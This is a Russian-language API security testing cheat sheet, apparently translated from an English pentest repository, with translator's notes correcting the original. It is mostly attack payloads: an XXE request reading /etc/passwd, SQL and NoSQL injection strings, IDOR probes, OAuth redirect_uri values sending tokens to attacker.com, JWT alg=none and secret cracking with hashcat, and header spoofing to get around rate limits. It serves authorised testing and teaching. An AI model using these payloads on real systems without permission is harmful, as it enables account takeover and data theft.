<a id="-api-security-testing-cheatsheet"></a>
# 🔌 Справочник по проверке безопасности API

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [OWASP API Top 10](#-owasp-api-top-10)
- [Проверка REST API](#-rest-api-testing)
- [Проверка GraphQL](#-graphql-testing)
- [Атаки на аутентификацию](#-authentication-attacks)
- [Атаки на JWT](#-jwt-attacks)
- [Распространённые уязвимости](#-common-vulnerabilities)

---

<a id="-owasp-api-top-10"></a>
## 🔴 OWASP API Top 10

> **Уточнение к оригиналу.** Таблица ниже сохранена в исходном порядке, но не совпадает с [OWASP API Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/): API6 — неограниченный доступ к чувствительным бизнес-процессам, API7 — SSRF, API8 — ошибки настройки безопасности, API9 — Improper Inventory Management. Риск API4 шире отсутствия rate limiting: он охватывает неограниченное потребление ресурсов.

| # | Уязвимость | Описание |
|---|---------------|-------------|
| 1 | **BOLA** | Нарушение авторизации на уровне объектов |
| 2 | **Нарушение аутентификации** | Слабые места аутентификации |
| 3 | **BOPLA** | Нарушение авторизации на уровне свойств объектов |
| 4 | **Неограниченное потребление ресурсов** | Нет ограничения частоты запросов |
| 5 | **BFLA** | Нарушение авторизации на уровне функций |
| 6 | **SSRF** | Подделка запросов со стороны сервера |
| 7 | **Ошибки настройки безопасности** | Настройки по умолчанию |
| 8 | **Отсутствие защиты** | Бизнес-процессы |
| 9 | **Ненадлежащий учёт ресурсов** | Старые API |
| 10 | **Небезопасное использование сторонних API** | Сторонние сервисы |

---

<a id="-rest-api-testing"></a>
## 🌐 Проверка REST API

<a id="discovery--enumeration"></a>
### Поиск и сбор сведений

```bash
# Найти конечные точки API (endpoints)
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Перебор версий
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Распространённые пути
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

<a id="http-methods-testing"></a>
### Проверка HTTP-методов

```bash
# Проверить все методы
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Переопределение метода
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

<a id="parameter-manipulation"></a>
### Манипуляции с параметрами

```bash
# BOLA/IDOR
GET /api/users/1      # Ваш идентификатор
GET /api/users/2      # Идентификатор другого пользователя
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Загрязнение параметров (parameter pollution)
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Обход с помощью кодирования
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

<a id="content-type-attacks"></a>
### Атаки через Content-Type

> **Уточнение.** В примере curl оригинала отсутствует URL назначения. Смена Content-Type сама по себе не создаёт XXE: результат зависит от обработки XML сервером. HTTP-запросы и фрагменты ниже сохранены дословно.

```bash
# Изменить Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE через Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

<a id="mass-assignment"></a>
### Массовое присваивание (Mass Assignment)

> **Уточнение.** Это иллюстративный HTTP-запрос с JSON-подобным телом: комментарии с символом # не входят в синтаксис JSON.

```bash
# Добавить дополнительные поля
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Попробовать добавить
  "isAdmin": true,           # Попробовать добавить
  "balance": 99999,          # Попробовать добавить
  "verified": true           # Попробовать добавить
}

# Использование массивов
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="-graphql-testing"></a>
## 📊 Проверка GraphQL

<a id="introspection"></a>
### Интроспекция

> **Уточнение.** По [спецификации GraphQL](https://spec.graphql.org/October2021/#sec-Schema-Introspection) интроспекция описывает схему. Первый запрос ниже получает лишь часть сведений, несмотря на подпись «Full» в оригинале; доступность типов и полей определяется схемой.

```graphql
# Запрос интроспекции (так назван в оригинале; см. уточнение)
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Простая интроспекция
{__schema{types{name,fields{name}}}}

# Получить все запросы
{__schema{queryType{fields{name,description}}}}

# Получить все мутации
{__schema{mutationType{fields{name,description}}}}
```

<a id="common-attacks"></a>
### Распространённые атаки

> **Уточнение.** В примере «Batching» используются псевдонимы полей одного GraphQL-запроса, а не пакет отдельных HTTP-запросов. Пример подсказок полей в оригинале не закрывает внешний блок фигурной скобкой; он сохранён как неполный фрагмент, а не готовый запрос.

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Несколько операций через aliases (псевдонимы полей)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Отказ в обслуживании через вложенный запрос
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Подсказки полей
{ user { a }  # Может предложить допустимые поля
```

<a id="sql-injection-in-graphql"></a>
### SQL-инъекция в GraphQL

```graphql
# SQL-инъекция в аргументах
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL-инъекция
query { user(query: "{$gt: ''}") { id } }
```

<a id="bypass-disabled-introspection"></a>
### Обход отключённой интроспекции

> **Уточнение.** __type также относится к [интроспекции GraphQL](https://spec.graphql.org/October2021/#sec-Schema-Introspection). Это не универсальный обход её отключения: при корректном запрете интроспекции такой запрос тоже блокируется.

```graphql
# Альтернативная интроспекция
query { __type(name: "User") { fields { name } } }

# Перебор полей через ffuf
# Используйте словарь распространённых имён полей GraphQL
```

---

<a id="-authentication-attacks"></a>
## 🔐 Атаки на аутентификацию

<a id="api-key-testing"></a>
### Проверка API-ключей

```bash
# Найти API-ключи
# Проверить JS-файлы, мобильные приложения и GitHub

# Проверить ключ в разных местах запроса
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

<a id="oauthoauth2-attacks"></a>
### Атаки на OAuth/OAuth2

```bash
# Кража токена через redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Обход проверки параметра state
# Удалить параметр state
# Использовать одинаковое значение state для разных пользователей

# Утечка токена
# Проверить заголовок Referer на утечку токена
```

<a id="session-management"></a>
### Управление сеансами

```bash
# Исследование токенов
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Старые токены остаются действительными после выхода?
# Проблемы ротации токенов
# Повторное использование токенов в разных сеансах
```

---

<a id="-jwt-attacks"></a>
## 🎫 Атаки на JWT

<a id="decode-jwt"></a>
### Декодирование JWT

> **Уточнение.** [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html#section-3) описывает JWT как сегменты, разделённые точками, с кодированием base64url. Команда оригинала с base64 -d для целого сокращённого токена — иллюстрация; декодирование не проверяет подпись.

```bash
# Онлайн: jwt.io
# Командная строка
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

<a id="algorithm-confusion"></a>
### Путаница алгоритмов (Algorithm Confusion)

> **Уточнение.** В подписи оригинала направление перепутано: типичный случай [algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) с открытым RSA-ключом как секретом HMAC — RS256 → HS256. Изменение alg, claims или удаление подписи работает только при ошибочной проверке токена; примеры сохранены дословно.

```bash
# Изменить alg на none
{
  "alg": "none",
  "typ": "JWT"
}
# Удалить подпись

# Атака HS256 → RS256 (направление из оригинала; см. уточнение)
# Использовать открытый ключ как секрет HMAC
```

<a id="signature-bypass"></a>
### Обход проверки подписи

```bash
# Удалить подпись (сохранить точки)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Перебор слабого секрета
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Распространённые слабые секреты
secret
password
123456
your-256-bit-secret
```

<a id="claim-manipulation"></a>
### Изменение утверждений (claims)

```javascript
// Изменить утверждения о пользователе (claims)
{
  "sub": "1234567890",
  "name": "admin",        // Изменить на admin
  "role": "admin",        // Повысить роль
  "admin": true,          // Добавить признак администратора
  "exp": 9999999999       // Увеличить срок действия
}
```

<a id="jwt-tools"></a>
### Инструменты для JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Изменение токена
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Перебор секрета

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="-common-vulnerabilities"></a>
## 🐛 Распространённые уязвимости

<a id="rate-limiting-bypass"></a>
### Обход ограничения частоты запросов

> **Уточнение.** Согласно [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110.html#name-field-names), имена HTTP-заголовков не зависят от регистра. Приведённые варианты сами по себе не гарантируют обход; результат зависит от доверия сервера к заголовкам и реализации ограничений.

```bash
# Заголовки для проверки
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Изменить регистр
X-FORWARDED-FOR: 127.0.0.1

# Нулевой байт
X-Forwarded-For: 127.0.0.1%00

# Разные конечные точки
/api/login
/API/LOGIN
/api/Login
/api/login/
```

<a id="bola-broken-object-level-authorization"></a>
### BOLA — нарушение авторизации на уровне объектов

```bash
# Проверить изменение идентификатора
GET /api/orders/123    # Ваш заказ
GET /api/orders/124    # Чужой заказ

# Угадывание UUID
# Проверить наличие предсказуемых закономерностей
# Проверить последовательные значения и значения на основе времени

# Идентификатор в разных форматах
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

<a id="bfla-broken-function-level-authorization"></a>
### BFLA — нарушение авторизации на уровне функций

```bash
# Обратиться к административным конечным точкам от имени обычного пользователя
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Проверка по HTTP-методам
GET /api/users     # Разрешено
POST /api/users    # Должно быть доступно только администратору?
DELETE /api/users  # Должно быть доступно только администратору?
```

<a id="improper-assets-management"></a>
### Ненадлежащий учёт ресурсов API

```bash
# Старые версии API
/api/v1/users    # Может содержать больше уязвимостей
/api/v2/users    # Текущая версия
/api/v3/users    # Бета-версия или ещё не выпущенная версия

# Конечные точки для разработки
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

| Инструмент | Назначение |
|------|---------|
| **Burp Suite** | Перехват и проверка запросов API |
| **Postman** | Изучение API |
| **Insomnia** | Клиент REST/GraphQL |
| **graphql-voyager** | Визуализация GraphQL |
| **jwt_tool** | Проверка JWT |
| **Arjun** | Поиск параметров |

---

<a id="-resources"></a>
## 📚 Ресурсы

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Защищайте свои API!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
